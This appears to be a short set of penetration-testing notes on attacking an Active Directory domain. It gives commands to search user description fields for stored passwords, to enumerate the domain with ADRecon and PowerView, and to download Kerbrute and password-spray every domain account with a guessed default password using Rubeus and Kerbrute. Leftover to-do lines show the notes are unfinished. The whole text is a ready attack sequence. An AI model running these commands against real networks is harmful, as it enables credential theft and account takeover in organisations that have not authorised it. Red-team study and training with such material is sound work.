# Sensitive Information stored within the AD

1.) Start ADExplorer and search through the AD for sensitive information

PS> adexplorer.exe

ADexplorer> search user description field contains pw, pwd, password, pass

2.) Enumerate the AD with ADRecon

PS> .\ADRecon.ps1

PS> .\ADRecon.ps1 -GenExcel .\ADRecon-Report-timestamp

TODO: wget Excel file since Excel will not be installed

# Standard Domain Password

1.) Identify the standard domain password and start a password spray attack

a.) Use Rubeus
PS> .\Rubeus.exe brute /password:Start123!

b.) Use Kerbrute
PS> Invoke-WebRequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe" -OutFile ".\kerbrute.exe"

PS> Import-Module .\PowerView.ps1

PS> (Get-NetUser | select samAccountName).samAccountName > users.txt

PS> .\kerbrute.exe passwordspray --domain contoso.azure .\users.txt Start123!
ToDo error

